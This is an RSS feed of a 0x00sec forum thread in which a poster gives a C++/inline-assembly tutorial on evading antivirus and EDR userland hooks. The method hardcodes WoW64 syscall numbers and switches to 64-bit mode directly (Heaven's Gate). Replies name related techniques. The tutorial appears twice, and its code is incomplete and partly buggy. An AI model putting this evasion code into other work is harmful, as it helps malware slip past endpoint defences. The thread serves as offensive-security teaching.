@@ -1,0 +1,426 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Bypassing Antivirus Userland hooks with direct system calls in x64 bit with syswow64</title>
+    <link>https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998</link>
+    <description>Hello guys i have new topic for bypassing AV EDR on x64bit system using x86 application and directly switch to 64bitmode , i hope you learn some thing and if you had any question let me know
+
+since iam a readteam tools developer i need to bypass the AV , and to do that we have alot of tricks to deal but to day i will use direct syscalls in wow64 hell ya i search in google there is know one create a blog or tut about this so i will try to be the 1s.
+
+
+Reversing Ntdll.dll and Hardcoding Syscalls directly from c++.
+
+In this tutorial I will show you how to reverse Ntdll.dll functions and find the System call then hardcoded it and use it in your c++ project to bypass Userland hooks.
+
+1 – reverse NtCreateFile and NtWriteFile functions and find the system call.
+2 – Create function prototype
+3 – Hardcode the function system call.
+4 – Use the function in main and All done.
+
+So lets start ,
+first open your IDA and drag and drop the Ntdll.dll from c:\windows\syswow64\ntdll.dll
+then make sure you import idb file .
+the next step go to Exports tap and search for Ntcreatefile function .
+Now we see :
+mov    eax, 55h ; &#39;U&#39;  ; NtCreateFile
+mov    edx, offset _Wow64SystemServiceCall@0 ; Wow64SystemServiceCall()
+call    edx ; Wow64SystemServiceCall() ; Wow64SystemServiceCall()
+retn    2Ch ; &#39;,&#39;
+
+move eax,55h 55 is the system call number for NtCreateFile function ,
+and  becouse we are in 64bit system and our application is 86bit so we need to switch to wow64bit ,
+so we need to make some changes to this asm code , what we ganna do is make switch to syswow64 manualy using call dword ptr fs :[0xC0]
+so the code will be like this :
+mov    eax,55h
+call dword ptr fs:[0xC0] ; wow64cpu.dll!X86SwitchTo64BitMode
+retn    2Ch
+now we have our asm code for NtcreateFile , now do the same for NtwriteFile function.
+
+Ok we are done save the asm code to text file any were in your disk and close IDA.
+Go to visual studio create new c++ empty project and follow me .
+What we need now is define the typedef of our functions and ofcurse we need to define others structs and STRING , UNICODE , functions like RtlAnsiStringToUnicodeString to convert the char to string then string to unicode with less code and liss missing.
+and becouse we are using Nt functions and we are hardcoding every thing we need to pay attention to the file path we want to write to it.
+if we use Winapi and need to create file using CreateFileA Or CreateFileW the path will be like this . c:\users\mose3c\Desktop\my.jpg
+and the winapi function will make every thing for you like converting the path to Nt Path . you can see this closely if you open ApiMonotring and trace the CreateFile function you will know what this function do for you and how much make your life easy.
+now our Nt path will be like this : \\??\\c:\\users\\mose3c\\Desktop\\my.jpg
+other wise will not work.
+ok lets define our functions prototype and others .
+
+```
+
+typedef _Return_type_success_(return &gt;= 0) LONG NTSTATUS;
+typedef struct _STRING { USHORT Length; USHORT MaximumLength; PCHAR Buffer; } STRING;
+typedef STRING* PSTRING;
+typedef STRING ANSI_STRING;
+typedef PSTRING PANSI_STRING;
+
+typedef struct _UNICODE_STRING
+{
+USHORT Length;
+USHORT MaximumLength;
+PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+typedef struct _OBJECT_ATTRIBUTES
+{
+ULONG          Length;
+HANDLE          RootDirectory;
+PUNICODE_STRING ObjectName;
+ULONG          Attributes;
+PVOID          SecurityDescriptor;
+PVOID          SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+typedef struct _IO_STATUS_BLOCK
+{
+union
+{
+NTSTATUS Status;
+VOID* Pointer;
+};
+ULONG_PTR Information;
+} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
+
+typedef NTSTATUS(NTAPI* _RtlGetVersion)(PRTL_OSVERSIONINFOW lpVersionInformation);
+
+typedef void (NTAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
+typedef DWORD(NTAPI* _RtlAnsiStringToUnicodeString)(PUNICODE_STRING, PANSI_STRING, BOOL);
+typedef VOID(NTAPI* _RtlInitString)(PSTRING DestinationString, char* SourceString);
+_RtlAnsiStringToUnicodeString RtlAnsiStringToUnicodeString = (_RtlAnsiStringToUnicodeString)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;RtlAnsiStringToUnicodeString&quot;);
+_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;RtlInitUnicodeString&quot;);
+_RtlInitString RtlInitString = (_RtlInitString)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;RtlInitString&quot;);
+
+
+typedef VOID(NTAPI* PIO_APC_ROUTINE)(_In_ PVOID ApcContext, _In_ PIO_STATUS_BLOCK IoStatusBlock, _In_ ULONG Reserved);
+```
+
+
+
+```
+/******* functions *******/
+typedef NTSTATUS(NTAPI* _NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize OPTIONAL, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer OPTIONAL, ULONG EaLength);
+typedef NTSTATUS(NTAPI* _NtWriteFile)(HANDLE  FileHandle, HANDLE Event, PIO_APC_ROUTINE  ApcRoutine, PVOID  ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID  Buffer, ULONG Length, PLARGE_INTEGER  ByteOffset, PULONG  Key);
+typedef NTSTATUS(NTAPI* _NtResumeThread)(HANDLE  ThreadHandle, PULONG  SuspendCount);
+typedef NTSTATUS(NTAPI* _NtClose)(HANDLE Handle);
+
+_NtCreateFile NtCreateFile;
+_NtWriteFile  NtWriteFile;
+_NtResumeThread NtResumeThread;
+_NtClose NtClose;
+
+now lets write our inline asm code .
+
+_declspec(naked) NTSTATUS _stdcall WIN10_64_NtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize OPTIONAL, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer OPTIONAL, ULONG EaLength)
+{
+_asm
+{
+mov    eax, 55h
+call    dword ptr fs : [0xC0]
+retn    2Ch
+}
+}
+
+_declspec(naked) NTSTATUS _stdcall WIN10_64_NtWriteFile(HANDLE  FileHandle, HANDLE Event, PIO_APC_ROUTINE  ApcRoutine, PVOID  ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID  Buffer, ULONG Length, PLARGE_INTEGER  ByteOffset, PULONG  Key)
+{
+_asm
+{
+mov  eax, 1A0008h
+call  dword ptr fs : [0xC0]
+retn  24h
+}
+}
+```
+
+ok done.whats next , lets go to to our main function.
+and pass the address of WIN10_64_NtCreateFile = to NtCreateFile and WIN10_64_NtWriteFile to NtWriteFile
+like this
+
+```
+NtCreateFile  = &amp;WIN10_64_NtCreateFile
+NtWriteFile = &amp;WIN10_64_NtWriteFile
+
+ok . and now we will define attributes and others args but its not our tutorial will skip it and if you need any help just replay and i will try to help you .
+
+NTSTATUS status;
+UNICODE_STRING Ustring;
+ANSI_STRING as;
+HANDLE hFile;
+IO_STATUS_BLOCK risb;
+OBJECT_ATTRIBUTES robj;
+
+char szDir[MAX_PATH];
+strcpy(szDir, &quot;\\??\\c:\users\mose3c\Desktop\my.txt&quot;);
+
+as.Buffer = (char*)malloc(strlen(szDir) + 1);
+strcpy(as.Buffer, szDir);
+as.Length = as.MaximumLength = Ustring.MaximumLength = Ustring.Length = strlen(szDir);
+
+// convert directory name from ANSI to UNICODE
+_RtlAnsiStringToUnicodeString RtlAnsiStringToUnicodeString = (_RtlAnsiStringToUnicodeString)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;RtlAnsiStringToUnicodeString&quot;);
+RtlAnsiStringToUnicodeString(&amp;Ustring, &amp;as, TRUE);
+
+
+RtlFillMemory(&amp;obj, sizeof(OBJECT_ATTRIBUTES), 0);
+robj.Length = sizeof(obj);
+robj.Attributes = OBJ_CASE_INSENSITIVE;
+robj.RootDirectory = NULL;
+robj.SecurityDescriptor = NULL;
+robj.SecurityQualityOfService = NULL;
+robj.ObjectName = &amp;Ustring;
+
+status = NtCreateFile(&amp;hFile, FILE_GENERIC_READ | FILE_GENERIC_WRITE | SYNCHRONIZE, &amp;obj, &amp;risb, 0, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+if (!NT_SUCCESS(status))
+      return 1 ;
+
+IO_STATUS_BLOCK WFISB;
+status = NtWriteFile(hFile, NULL, NULL, NULL, &amp;WFISB, /*your Buffer here*/, BufLen, 0, NULL);
+
+if (!NT_SUCCESS(status))
+return 1;
+```
+
+now Its bingo we have  done build the project and test it if you need to run it in windows 7 you need to reverse the ntdll.dll for windows 7
+becouse its wow64 you can&#39;t find alot of content and you have to done it by your self
+
+i realy want to make more tutorials what do you like the next tutorial to be about .?
+its up to you let me know in replay pleas .</description>
+    
+    <lastBuildDate>Tue, 29 Mar 2022 20:06:38 +0000</lastBuildDate>
+    <category>Malware</category>
+    <atom:link href="https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Bypassing Antivirus Userland hooks with direct system calls in x64 bit with syswow64</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998/7</link>
+        <pubDate>Fri, 06 May 2022 11:39:05 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-27998-7</guid>
+        <source url="https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998.rss">Bypassing Antivirus Userland hooks with direct system calls in x64 bit with syswow64</source>
+      </item>
+      <item>
+        <title>Bypassing Antivirus Userland hooks with direct system calls in x64 bit with syswow64</title>
+        <dc:creator><![CDATA[C_J]]></dc:creator>
+        <description><![CDATA[
+            <p>There are methods that can be bypassed. “Vendors have to install UM hooks in each process since Microsoft doesn’t provide a legitimate way for components to receive notifications about memory operations.” In response to this, various techniques to circumvent them have been devised and what follows is a brief description and source code in C to demonstrate some of those methods currently being used.</p>
+<ol>
+<li>The address table is exported. The address of system calls can be resolved using a combination of GetModuleProc and GetHandleAddress. It is possible to manually locate NTDLL. The system call can be found through the dll in the Process Environment Block. The code you see is used to read the EAT.</li>
+</ol>
+          <p><a href="https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998/6</link>
+        <pubDate>Tue, 29 Mar 2022 20:06:38 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-27998-6</guid>
+        <source url="https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998.rss">Bypassing Antivirus Userland hooks with direct system calls in x64 bit with syswow64</source>
+      </item>
+      <item>
+        <title>Bypassing Antivirus Userland hooks with direct system calls in x64 bit with syswow64</title>
+        <dc:creator><![CDATA[crimsonRain]]></dc:creator>
+        <description><![CDATA[
+            <p>Never heard of Tartarus, so many gates…</p>
+          <p><a href="https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998/4</link>
+        <pubDate>Thu, 06 Jan 2022 15:33:43 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-27998-4</guid>
+        <source url="https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998.rss">Bypassing Antivirus Userland hooks with direct system calls in x64 bit with syswow64</source>
+      </item>
+      <item>
+        <title>Bypassing Antivirus Userland hooks with direct system calls in x64 bit with syswow64</title>
+        <dc:creator><![CDATA[mose3c]]></dc:creator>
+        <description><![CDATA[
+            <p>yes thanks for the mention</p>
+          <p><a href="https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998/3</link>
+        <pubDate>Wed, 05 Jan 2022 14:24:02 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-27998-3</guid>
+        <source url="https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998.rss">Bypassing Antivirus Userland hooks with direct system calls in x64 bit with syswow64</source>
+      </item>
+      <item>
+        <title>Bypassing Antivirus Userland hooks with direct system calls in x64 bit with syswow64</title>
+        <dc:creator><![CDATA[c0z]]></dc:creator>
+        <description><![CDATA[
+            <p>It would have been nice of you to mention the technique described here was <a href="http://rce.co/knockin-on-heavens-gate-dynamic-processor-mode-switching/" rel="noopener nofollow ugc">Heavens Gate</a>. There is also Heresy’s Gate / Hell’s Gate, Halo’s Gate / Tartarus’ Gate.</p>
+<p>            <iframe src="https://www.youtube.com/embed/OuN2jgre-3o?feature=oembed&amp;wmode=opaque&amp;list=PLmv8T5-GONwS8G-6lKgRdtPo6wGX6xrd1&amp;start=340" width="480" height="360" frameborder="0" allowfullscreen="" seamless="seamless" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-presentation"></iframe>
+</p>
+          <p><a href="https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998/2</link>
+        <pubDate>Wed, 05 Jan 2022 10:07:07 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-27998-2</guid>
+        <source url="https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998.rss">Bypassing Antivirus Userland hooks with direct system calls in x64 bit with syswow64</source>
+      </item>
+      <item>
+        <title>Bypassing Antivirus Userland hooks with direct system calls in x64 bit with syswow64</title>
+        <dc:creator><![CDATA[mose3c]]></dc:creator>
+        <description><![CDATA[
+            <p>Hello guys i have new topic for bypassing AV EDR on x64bit system using x86 application and directly switch to 64bitmode , i hope you learn some thing and if you had any question let me know</p>
+<p>since iam a readteam tools developer i need to bypass the AV , and to do that we have alot of tricks to deal but to day i will use direct syscalls in wow64 hell ya i search in google there is know one create a blog or tut about this so i will try to be the 1s.</p>
+<p>Reversing Ntdll.dll and Hardcoding Syscalls directly from c++.</p>
+<p>In this tutorial I will show you how to reverse Ntdll.dll functions and find the System call then hardcoded it and use it in your c++ project to bypass Userland hooks.</p>
+<p>1 – reverse NtCreateFile and NtWriteFile functions and find the system call.<br>
+2 – Create function prototype<br>
+3 – Hardcode the function system call.<br>
+4 – Use the function in main and All done.</p>
+<p>So lets start ,<br>
+first open your IDA and drag and drop the Ntdll.dll from c:\windows\syswow64\ntdll.dll<br>
+then make sure you import idb file .<br>
+the next step go to Exports tap and search for Ntcreatefile function .<br>
+Now we see :<br>
+mov    eax, 55h ; ‘U’  ; NtCreateFile<br>
+mov    edx, offset _Wow64SystemServiceCall@0 ; Wow64SystemServiceCall()<br>
+call    edx ; Wow64SystemServiceCall() ; Wow64SystemServiceCall()<br>
+retn    2Ch ; ‘,’</p>
+<p>move eax,55h 55 is the system call number for NtCreateFile function ,<br>
+and  becouse we are in 64bit system and our application is 86bit so we need to switch to wow64bit ,<br>
+so we need to make some changes to this asm code , what we ganna do is make switch to syswow64 manualy using call dword ptr fs :[0xC0]<br>
+so the code will be like this :<br>
+mov    eax,55h<br>
+call dword ptr fs:[0xC0] ; wow64cpu.dll!X86SwitchTo64BitMode<br>
+retn    2Ch<br>
+now we have our asm code for NtcreateFile , now do the same for NtwriteFile function.</p>
+<p>Ok we are done save the asm code to text file any were in your disk and close IDA.<br>
+Go to visual studio create new c++ empty project and follow me .<br>
+What we need now is define the typedef of our functions and ofcurse we need to define others structs and STRING , UNICODE , functions like RtlAnsiStringToUnicodeString to convert the char to string then string to unicode with less code and liss missing.<br>
+and becouse we are using Nt functions and we are hardcoding every thing we need to pay attention to the file path we want to write to it.<br>
+if we use Winapi and need to create file using CreateFileA Or CreateFileW the path will be like this . c:\users\mose3c\Desktop\my.jpg<br>
+and the winapi function will make every thing for you like converting the path to Nt Path . you can see this closely if you open ApiMonotring and trace the CreateFile function you will know what this function do for you and how much make your life easy.<br>
+now our Nt path will be like this : \??\c:\users\mose3c\Desktop\my.jpg<br>
+other wise will not work.<br>
+ok lets define our functions prototype and others .</p>
+<pre><code class="lang-auto">
+typedef _Return_type_success_(return &gt;= 0) LONG NTSTATUS;
+typedef struct _STRING { USHORT Length; USHORT MaximumLength; PCHAR Buffer; } STRING;
+typedef STRING* PSTRING;
+typedef STRING ANSI_STRING;
+typedef PSTRING PANSI_STRING;
+
+typedef struct _UNICODE_STRING
+{
+USHORT Length;
+USHORT MaximumLength;
+PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+typedef struct _OBJECT_ATTRIBUTES
+{
+ULONG          Length;
+HANDLE          RootDirectory;
+PUNICODE_STRING ObjectName;
+ULONG          Attributes;
+PVOID          SecurityDescriptor;
+PVOID          SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+typedef struct _IO_STATUS_BLOCK
+{
+union
+{
+NTSTATUS Status;
+VOID* Pointer;
+};
+ULONG_PTR Information;
+} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
+
+typedef NTSTATUS(NTAPI* _RtlGetVersion)(PRTL_OSVERSIONINFOW lpVersionInformation);
+
+typedef void (NTAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
+typedef DWORD(NTAPI* _RtlAnsiStringToUnicodeString)(PUNICODE_STRING, PANSI_STRING, BOOL);
+typedef VOID(NTAPI* _RtlInitString)(PSTRING DestinationString, char* SourceString);
+_RtlAnsiStringToUnicodeString RtlAnsiStringToUnicodeString = (_RtlAnsiStringToUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAnsiStringToUnicodeString");
+_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
+_RtlInitString RtlInitString = (_RtlInitString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitString");
+
+
+typedef VOID(NTAPI* PIO_APC_ROUTINE)(_In_ PVOID ApcContext, _In_ PIO_STATUS_BLOCK IoStatusBlock, _In_ ULONG Reserved);
+</code></pre>
+<pre><code class="lang-auto">/******* functions *******/
+typedef NTSTATUS(NTAPI* _NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize OPTIONAL, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer OPTIONAL, ULONG EaLength);
+typedef NTSTATUS(NTAPI* _NtWriteFile)(HANDLE  FileHandle, HANDLE Event, PIO_APC_ROUTINE  ApcRoutine, PVOID  ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID  Buffer, ULONG Length, PLARGE_INTEGER  ByteOffset, PULONG  Key);
+typedef NTSTATUS(NTAPI* _NtResumeThread)(HANDLE  ThreadHandle, PULONG  SuspendCount);
+typedef NTSTATUS(NTAPI* _NtClose)(HANDLE Handle);
+
+_NtCreateFile NtCreateFile;
+_NtWriteFile  NtWriteFile;
+_NtResumeThread NtResumeThread;
+_NtClose NtClose;
+
+now lets write our inline asm code .
+
+_declspec(naked) NTSTATUS _stdcall WIN10_64_NtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize OPTIONAL, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer OPTIONAL, ULONG EaLength)
+{
+_asm
+{
+mov    eax, 55h
+call    dword ptr fs : [0xC0]
+retn    2Ch
+}
+}
+
+_declspec(naked) NTSTATUS _stdcall WIN10_64_NtWriteFile(HANDLE  FileHandle, HANDLE Event, PIO_APC_ROUTINE  ApcRoutine, PVOID  ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID  Buffer, ULONG Length, PLARGE_INTEGER  ByteOffset, PULONG  Key)
+{
+_asm
+{
+mov  eax, 1A0008h
+call  dword ptr fs : [0xC0]
+retn  24h
+}
+}
+</code></pre>
+<p>ok done.whats next , lets go to to our main function.<br>
+and pass the address of WIN10_64_NtCreateFile = to NtCreateFile and WIN10_64_NtWriteFile to NtWriteFile<br>
+like this</p>
+<pre><code class="lang-auto">NtCreateFile  = &amp;WIN10_64_NtCreateFile
+NtWriteFile = &amp;WIN10_64_NtWriteFile
+
+ok . and now we will define attributes and others args but its not our tutorial will skip it and if you need any help just replay and i will try to help you .
+
+NTSTATUS status;
+UNICODE_STRING Ustring;
+ANSI_STRING as;
+HANDLE hFile;
+IO_STATUS_BLOCK risb;
+OBJECT_ATTRIBUTES robj;
+
+char szDir[MAX_PATH];
+strcpy(szDir, "\\??\\c:\users\mose3c\Desktop\my.txt");
+
+as.Buffer = (char*)malloc(strlen(szDir) + 1);
+strcpy(as.Buffer, szDir);
+as.Length = as.MaximumLength = Ustring.MaximumLength = Ustring.Length = strlen(szDir);
+
+// convert directory name from ANSI to UNICODE
+_RtlAnsiStringToUnicodeString RtlAnsiStringToUnicodeString = (_RtlAnsiStringToUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAnsiStringToUnicodeString");
+RtlAnsiStringToUnicodeString(&amp;Ustring, &amp;as, TRUE);
+
+
+RtlFillMemory(&amp;obj, sizeof(OBJECT_ATTRIBUTES), 0);
+robj.Length = sizeof(obj);
+robj.Attributes = OBJ_CASE_INSENSITIVE;
+robj.RootDirectory = NULL;
+robj.SecurityDescriptor = NULL;
+robj.SecurityQualityOfService = NULL;
+robj.ObjectName = &amp;Ustring;
+
+status = NtCreateFile(&amp;hFile, FILE_GENERIC_READ | FILE_GENERIC_WRITE | SYNCHRONIZE, &amp;obj, &amp;risb, 0, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+if (!NT_SUCCESS(status))
+      return 1 ;
+
+IO_STATUS_BLOCK WFISB;
+status = NtWriteFile(hFile, NULL, NULL, NULL, &amp;WFISB, /*your Buffer here*/, BufLen, 0, NULL);
+
+if (!NT_SUCCESS(status))
+return 1;
+</code></pre>
+<p>now Its bingo we have  done build the project and test it if you need to run it in windows 7 you need to reverse the ntdll.dll for windows 7<br>
+becouse its wow64 you can’t find alot of content and you have to done it by your self</p>
+<p>i realy want to make more tutorials what do you like the next tutorial to be about .?<br>
+its up to you let me know in replay pleas .</p>
+          <p><a href="https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998/1</link>
+        <pubDate>Tue, 04 Jan 2022 19:38:22 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-27998-1</guid>
+        <source url="https://0x00sec.org/t/bypassing-antivirus-userland-hooks-with-direct-system-calls-in-x64-bit-with-syswow64/27998.rss">Bypassing Antivirus Userland hooks with direct system calls in x64 bit with syswow64</source>
+      </item>
+  </channel>
+</rss>
